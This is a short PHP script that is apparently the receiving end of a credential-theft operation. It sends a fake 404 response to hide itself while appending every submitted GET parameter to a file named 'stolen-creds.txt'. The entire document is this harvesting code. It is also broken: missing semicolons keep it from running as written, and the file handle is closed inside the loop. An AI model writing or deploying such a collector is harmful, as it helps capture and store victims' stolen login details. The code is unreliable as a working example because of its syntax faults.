<?php
	header('HTTP/1.0 404 Not Found');
	$handle = fopen("stolen-creds.txt", "a")
	foreach($_GET as $variable => $value) {
		fwrite($handle, "$variable=$value\n");
		fclose($handle);
	}
	fclose($handle)
?>

